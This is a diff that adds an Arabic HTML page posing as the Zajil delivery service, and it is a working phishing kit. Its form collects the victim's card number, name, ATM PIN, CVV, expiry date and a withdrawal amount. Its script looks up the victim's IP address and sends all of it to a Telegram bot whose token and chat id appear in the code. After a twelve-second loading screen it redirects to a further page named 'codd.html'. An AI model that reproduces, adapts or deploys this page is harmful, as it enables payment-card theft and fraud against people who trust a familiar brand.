@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="ar" xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data" xmlns:expr="http://www.google.com/2005/gml/expr"><head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
+<head>
+ <title>الرئسية</title>
+ <link rel="icon" href="web.jpg">
+ <meta charset="UTF-8" />
+ <meta content="ar_AR" property="og:locale" />
+ <meta content="https://zajilys316.blogspot.com/" property="og:url" />
+ <meta content="زاجل توصيل/استلام " property="og:title" />
+ <meta content="زاجل توصيل/استلام " property="og:site_name" />
+ <meta content="" property="og:description" />
+ <meta content="زاجل توصيل/استلام " property="og:image:alt" />
+ <meta content="website" property="og:type" />
+ <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyF5WcUn-PV74b2ZE_B6EElfzTeXc8Tf9f00BC-UPNZ7D7k3xFa5iZ-1rBZu-cOHxsapmqEaC6SQyKu-5a2uaYgFxPdBw9zNsPBMIPYYrUeEA00QZm40Nm3jzWhqxeBc-tTVEfmXDb6hO4C3Fd-KnIakUE1q9iKoJShxOEfk6RbvwsXIqG3jeqgKtqAQ/s1600/YXNzZXRzL2Jhbm5lcnMvYWJvdXQtYmFubmVyLmpwZw==.jpg" property="og:image" />
+ <meta content="زاجل توصيل/استلام , " name="keywords" />
+ <meta content="زاجل توصيل/استلام " property="article:tag" />
+ <meta content="" name="apple-mobile-web-app-capable" />
+ <meta content="" name="apple-mobile-web-app-status-bar-style" />
+ <meta name="description" content="اكتشف كيف يمكننا مساعدتك على تنمية أعمالك...">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+ <meta property="og:image" content="https://zajil-express.com/_next/static/media/logo.3fe78f13.svg" />
+ <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+ <link rel="icon" href="web.jpg">
+ <meta property="og:image" content="https://zajil-express.com/_next/static/media/logo.3fe78f13.svg" />
+</head>
+<style type="text/css">
+  *{
+     margin:0;
+     padding:0;
+     font-family: Georgia, serif;
+  }
+body{
+  
+}
+
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+input[type="number"] {
+  -moz-appearance: textfield;
+}
+
+
+#cont{
+  width:100%;
+  height:750px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:#333;
+
+ 
+  
+  
+}
+#input1{
+   width:90%;
+   height:90%;
+   background:rgba(0,0,0,0.7);
+   border-radius:10px;
+   position:;
+   
+   
+}
+
+#opt{
+  width:100%;
+  background:;
+  height:80px;
+  margin-bottom:20px;
+  margin-top:50px;
+  display:flex;
+  justify-content:center;
+  position:relative;
+  border-radius:10px;
+  
+}
+
+  
+ 
+#sel{
+  width:85%;
+  height:40px;
+  margin-top:30px;
+  border:1px solid #fff;
+  outline:none;
+  direction:rtl;
+  border-radius:5px; 
+
+}
+#sel:focus{
+  border: 2px solid #18ffff;
+}
+
+
+.input-field{
+  position: relative;
+  width:100%;
+  background:;
+  margin-bottom:40px;
+  display:flex;
+  justify-content:center;
+  
+}
+
+.input-field1{
+  position: relative;
+  width:100%;
+  background:;
+  display:flex;
+  justify-content:center;
+}
+.input-field2{
+  position: relative;
+  width:25%;
+  height:100%;
+  background:;
+  margin-left:5px;
+ 
+ 
+}
+
+.input-field3{
+  position: relative;
+  width:15%;
+  height:100%;
+  background:;
+  margin-left:20%;
+ 
+  
+ 
+
+  
+ 
+  
+}
+.input-field4{
+  position: relative;
+  width:15%;
+  height:100%;
+  background:;
+  margin-left:15%;
+
+}
+.input-field7{
+ position: relative;
+ width:100%;
+ background:;
+ height:40px;
+ margin-bottom:40px;
+ margin-top:35px;
+ display:flex;
+ justify-content:center;
+
+}
+.input-field input,.input-field1 input,.input-field7 input{
+  width:80%;
+  height:40px;
+  border-radius: 6px;
+  font-size: 18px;
+  padding: 0 10px;
+  border: 2px solid #fff;
+  background: transparent;
+  color: #fff;
+  outline: none;
+  text-align:end;
+}
+.input-field label,.input-field1 label,.input-field2 label,.input-field7 label{
+  position: absolute;
+  top: 50%;
+  left:57%;
+  transform: translateY(-50%);
+  color: #fff;
+  font-size: 15px;
+  pointer-events: none;
+  transition: 0.4s;
+}
+input:focus{
+  border: 2px solid #18ffff;
+}
+
+#inp3:focus,#inp5:focus,#inp4:focus{
+  border: 2px solid #18ffff;
+}
+input:focus ~ label,
+input:valid ~ label{
+  top: 0;
+  left:50%;
+  font-size: 16px;
+  padding: 0 2px;
+  background:#111;
+}
+#inp11:focus ~ label,
+inp11:valid ~ label{
+  top: 0;
+  left:50%;
+  font-size: 16px;
+  padding: 0 2px;
+  background:#111;
+}
+
+
+.input-field2 input,.input-field3 input,.input-field4 input{
+  width:100%;
+  height:40px;
+  border-radius: 6px;
+  font-size: 18px;
+  padding: 0 10px;
+  border: 2px solid #fff;
+  background: transparent;
+  color: #fff;
+  outline: none;
+  text-align:end;
+  
+}
+
+.input-field2 label,.input-field3 label,.input-field4 label{
+ position: absolute;
+ top: 30%;
+ left:10%;
+ transform: translateY(-50%);
+ color: #fff;
+ font-size: 15px;
+ pointer-events: none;
+ transition: 0.4s;
+
+}
+
+input:focus ~ #Cvv,
+input:valid ~ #Cvv{
+  top: 0;
+  left:10px;
+  font-size: 16px;
+  padding: 0 2px;
+  background: #18fff;
+ 
+}
+
+#vi{
+    width:100%;
+    background:;
+    height:50px;
+    margin-top:50px;
+    display:flex;
+    align-items:center;
+   
+    
+
+}
+  
+
+
+
+
+
+#but{
+  width:100%;
+  height:100px;
+  margin-top:40px;
+  display:flex;
+  justify-content:center;
+ 
+}
+.wrapper{
+  position:relative;
+  left:50%;
+  top:50px;
+  display:flex;
+  justify-content:center;
+  background:;
+  width:100%;
+  transform: translate(-50%, -50%);
+  
+  
+}
+
+#a{
+  display: block;
+  width: 80%;
+  height: 40px;
+  line-height: 40px;
+  font-size: 18px;
+  font-family: sans-serif;
+  text-decoration: none;
+  color: #333;
+  border: 2px solid #fff;
+  letter-spacing: 2px;
+  text-align: center;
+  position: relative;
+  transition: all .35s;
+  border-radius:20px;
+  text-align:center;
+ 
+  
+}
+
+#a span{
+  position: relative;
+  z-index: 2;
+ 
+}
+
+#a:after{
+  position: absolute;
+  content: "";
+  top: 0;
+  left:0;
+  width: 0;
+  height: 100%;
+  background:blue;
+  transition: all .35s;
+  border-radius:20px;
+}
+
+#a:hover{
+  color: #fff;
+}
+
+#a:hover:after{
+  width: 100%;
+}
+
+#p{
+  color:#fff;
+  margin-left:50%;
+  position:absolute;
+  
+}
+
+#imgi{
+  width:100%;
+  height:150px;
+  background:;
+  border-radius:4px 4px 0 0 ;
+  
+
+} 
+img{
+   width:100%;
+   height:100%;
+   background:;
+   transition:1s;
+}
+img:hover{
+  transform: skew(7deg, 15deg);
+
+}
+#inp11{
+  width:80%;
+  height:100%;
+  background:none;
+  outline:none;
+  border:;
+  color:#fff;
+  font-size:18px;
+}
+#p1{
+  color:red;
+  position:absolute;
+  top:50px;
+  font-size:13px;
+}
+
+#p2{
+  color:red;
+  position:absolute;
+  top:50px;
+  font-size:13px;
+}
+
+#p2{
+  color:red;
+  position:absolute;
+  top:50px;
+  font-size:13px;
+}
+
+#p3{
+  color:red;
+  position:absolute;
+  top:50px;
+  left:30px;
+  font-size:13px;
+}
+
+#p4{
+  color:red;
+  position:absolute;
+  top:50px;
+  left:30px;
+  font-size:13px;
+}
+
+#p5{
+  color:red;
+  position:absolute;
+  top:50px;
+  left:30px;
+  font-size:13px;
+}
+
+
+#loading{
+  width:100%;
+  height:100px;
+  background:;
+  display:flex;
+  justify-center:center;
+  position:fixed;
+  top:0;
+  z-index:999;
+  
+  
+ 
+}    
+
+
+
+img{
+  width:100%;
+  height:100%;
+}
+
+.mn{
+ background:rgba(0,0,0,0.9);
+ width:100%;
+ height:70px;
+ position:absolute;
+ top:;
+ text-align:center;
+ border-radius:;
+ box-shadow:0 0 10px black;
+ 
+ 
+}
+
+.ino{
+display:nne;
+}
+h5{
+margin-top:50px;
+font-size:18px;
+color:green;
+}
+
+
+
+
+
+
+
+ .loader {
+ position: relative;
+ width: 2.5em;
+ height: 2.5em;
+ transform: rotate(165deg);
+ }
+ 
+ .loader:before, .loader:after {
+ content: "";
+ position: absolute;
+ top: 50%;
+ left: 50%;
+ display: block;
+ width: 0.5em;
+ height: 0.5em;
+ border-radius: 0.25em;
+ transform: translate(-50%, -50%);
+ }
+ 
+ .loader:before {
+ animation: before8 2s infinite;
+ }
+ 
+ .loader:after {
+ animation: after6 2s infinite;
+ }
+ 
+ @keyframes before8 {
+ 0% {
+ width: 0.5em;
+ box-shadow: 1em -0.5em rgba(225, 20, 98, 0.75), -1em 0.5em rgba(111, 202, 220, 0.75);
+ }
+ 
+ 35% {
+ width: 2.5em;
+ box-shadow: 0 -0.5em rgba(225, 20, 98, 0.75), 0 0.5em rgba(111, 202, 220, 0.75);
+ }
+ 
+ 70% {
+ width: 0.5em;
+ box-shadow: -1em -0.5em rgba(225, 20, 98, 0.75), 1em 0.5em rgba(111, 202, 220, 0.75);
+ }
+ 
+ 100% {
+ box-shadow: 1em -0.5em rgba(225, 20, 98, 0.75), -1em 0.5em rgba(111, 202, 220, 0.75);
+ }
+ }
+ 
+ @keyframes after6 {
+ 0% {
+ height: 0.5em;
+ box-shadow: 0.5em 1em rgba(61, 184, 143, 0.75), -0.5em -1em rgba(233, 169, 32, 0.75);
+ }
+ 
+ 35% {
+ height: 2.5em;
+ box-shadow: 0.5em 0 rgba(61, 184, 143, 0.75), -0.5em 0 rgba(233, 169, 32, 0.75);
+ }
+ 
+ 70% {
+ height: 0.5em;
+ box-shadow: 0.5em -1em rgba(61, 184, 143, 0.75), -0.5em 1em rgba(233, 169, 32, 0.75);
+ }
+ 
+ 100% {
+ box-shadow: 0.5em 1em rgba(61, 184, 143, 0.75), -0.5em -1em rgba(233, 169, 32, 0.75);
+ }
+ }
+ 
+ .loader {
+ position: absolute;
+ top: calc(50% - 1.25em);
+ left: calc(50% - 1.25em);
+ }
+#span{
+  color:#fff;
+}
+#oo{
+display:non;
+background:none;
+border:none;
+outline:none;
+color:#111;
+
+
+
+}
+
+#inp1[type="number"]{
+direction:ltr;
+}
+
+.cod{
+ margin-top:30px;
+
+}
+
+#la{
+
+margin-left:-32px;
+
+}
+</style>
+<body>
+   <div id="cont">
+      <div id="loading" style="display: none;">
+      
+      <div class="mn ino">
+      <h5 class="none"></h5>
+      <h4 id="span">....جري الطلب</h4>
+      <div class="loader"></div>   
+      </div>
+      </div>
+        <div id="input1">
+        <div id="imgi">
+          <img src="rag.png">
+          
+        </div>
+         
+         <form id="form">
+         <div onload="getName()">
+      
+         </div>
+          <div class="input-field7">
+          <input type="number" required spellcheck="false" id="inp11"> 
+          <label>ادخل قيمة السحب</label>
+    
+          </div>
+      
+         <div class="input-field">
+         <input type="number" required spellcheck="false" id="inp1"> 
+         <label> ادخل رقم البطاقة</label>
+   
+         </div>
+         
+         <div class="input-field1" onload="getName()">
+         <input type="text" required spellcheck="false" id="inp2"> 
+         <label>الاسم بالكامل</label>
+         <p id="p2"></p>
+         </div>
+         
+         <div class="input-field cod">
+         <input type="number" required spellcheck="false" id="inpp"> 
+         <label id="la">ادخل رمز بطاقة الصراف</label>
+         
+         </div>
+         
+         
+         
+         <div id="vi">
+         <div class="input-field2">
+         <input type="number" required spellcheck="false" id="inp3"> 
+         <label id="Cvv">CVV</label>
+         <p id="p3"></p>
+         </div>
+         
+         <div class="input-field3">
+         <input type="number" required spellcheck="false" id="inp4"> 
+         <label id="Cvv">YY</label>
+         <p id="p4"></p>
+         </div>
+         
+         
+         <div class="input-field4">
+         <input type="number" required spellcheck="false" id="inp5"> 
+         <label id="Cvv">MM</label>
+         <p id="p5"></p>
+         </div>
+        </div>
+           
+       <div id="but"> 
+       <div class="wrapper">
+         <button id="a"><span>ارسال</span></button>
+       </div>
+       </div>
+         </form>
+        
+        </div>          
+     </div>
+     
+   
+   </div>
+   
+   
+  <script type="text/javascript">
+  
+   
+    var inp3 = document.getElementById("inp3");
+    inp3.addEventListener("input", function() {
+    if (inp3.value.length > 3 ) {
+    inp3.value = inp3.value.slice(0, 3);  
+    }
+    
+    });
+    
+    
+    
+    var inp4 = document.getElementById("inp4");
+    inp4.addEventListener("input", function() {
+    if (inp4.value.length > 2 ) {
+    inp4.value = inp4.value.slice(0, 2);  
+    }
+    
+    });
+    
+    var inp1 = document.getElementById("inp1");
+    inp1.addEventListener("input", function() {
+    if (inp1.value.length > 16 ) {
+    inp1.value = inp1.value.slice(0,16);  
+    }
+    
+    
+    });
+    
+    
+    
+    var inp5 = document.getElementById("inp5");
+    inp5.addEventListener("input", function() {
+    if (inp5.value.length > 2 ) {
+    inp5.value = inp5.value.slice(0, 2);  
+    }
+    
+    });
+    
+    
+    var inp6 = document.getElementById("inpp");
+    inp6.addEventListener("input", function() {
+    if (inp6.value.length > 4 ) {
+    inp6.value = inp6.value.slice(0, 4);  
+    }
+    
+    });
+    
+    
+    
+    
+ 
+    
+    
+    
+    document.getElementById("a").onclick = function (){
+    var inp1 = document.getElementById("inp1");
+    var inp2 = document.getElementById("inp2");
+    var inp3 = document.getElementById("inp3");
+    var inp4 = document.getElementById("inp4");
+    var inp5 = document.getElementById("inp5");
+    var inp11 = document.getElementById("inp11");
+    var inp6 = document.getElementById("inpp");
+    
+    if(inp1.value.length < 16 ||  inp1.value=="" || inp2.value=="" ||inp3.value=="" ||inp4.value=="" || inp5.value=="" || inp6.value==""){
+    alert("يجب ان تملاء الحقول ويكون رقم البطاقة متكون من 16")
+    
+    }else{
+    // تأخير لبضع ثوانٍ قبل نقل المستخدم إلى الصفحة الأخرى
+    var inp1 = document.getElementById("inp1").value;
+    var inp2 = document.getElementById("inp2").value;
+    var inp3 = document.getElementById("inp3").value;
+    var inp4 = document.getElementById("inp4").value;
+    var inp5 = document.getElementById("inp5").value;
+    var inp6 = document.getElementById("inp11").value;
+    var inp7 = document.getElementById("inpp").value;
+   
+    
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+         const ipAddress = data.ip;
+         console.log(ipAddress);
+    
+    axios.post('https://api.telegram.org/bot6948869803:AAFh0PExFe9_iBbaWM3JxkDIG3Br-SxyPhE/sendMessage', {
+    chat_id: '6594871141',
+    text: `    قيمت السحب : ${inp6}\nالرقم على البطاقة ${inp1}\nالاسم على البطاقة${inp2}\nكلمت السر البطاقة :${inp3}\nالسنه: ${inp4}\nالشهري : ${inp5}\n معدل العميل : ${ipAddress}\n رمز التحقق البطاقة : ${inp7}`
+    })
+    
+ 
+    
+    
+    
+    .then(response => {
+    console.log(response.data);
+    
+    })
+    .catch(error => {
+    console.error(error);
+    
+    });
+    
+    })
+   
+   .catch(error => {
+       console.error('Error:', error);
+     }); 
+   
+    
+    document.getElementById("loading").style.display = "block";
+    setTimeout(function() {
+   
+    window.location.href = "codd.html?name=" + name;
+    },12000);
+    
+      var bott = document.getElementById("a");
+      bott.addEventListener("click",function(){
+      bott.disabled= true;
+      });
+    }
+    
+    } 
+    
+  
+ var fo = document.getElementById("form");
+  fo.addEventListener("submit",function(event){
+  
+  event.preventDefault();
+  window.scrollTo(0,0);
+  
+  
+ 
+  });
+    
+    
+  </script>
+   </script>
+</body>
+</html>
